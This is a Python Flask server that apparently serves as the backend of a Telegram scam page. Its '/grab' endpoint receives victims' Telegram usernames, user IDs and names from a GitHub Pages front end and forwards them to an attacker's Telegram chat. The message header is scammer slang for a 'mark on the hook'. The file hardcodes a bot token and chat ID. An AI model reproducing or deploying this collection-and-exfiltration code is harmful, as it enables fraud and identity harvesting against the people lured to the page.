import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app) # Разрешаем запросы с GitHub Pages

TOKEN = "8733015341:AAGXiGUv57x63oHQumkJot1pXyC-HvSLOzY"
CHAT_ID = "-1003794470658"

def send_to_tg(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.json()
    except Exception as e:
        return str(e)

@app.route('/')
def home():
    return "SERVER IS RUNNING WITH CORS"

@app.route('/grab', methods=['POST', 'OPTIONS'])
def grab():
    if request.method == 'OPTIONS':
        return jsonify({"status": "ok"}), 200
    
    try:
        data = request.get_json()
        user = data.get('username', 'Unknown')
        uid = data.get('user_id', 'Unknown')
        name = data.get('first_name', 'No name')
        
        msg = f"🎯 <b>МАМОНТ НА КРЮЧКЕ!</b>\n\n👤 Имя: {name}\n🔗 Юзер: @{user}\n🆔 ID: <code>{uid}</code>"
        res = send_to_tg(msg)
        
        return jsonify({"status": "ok", "tg_response": res}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)


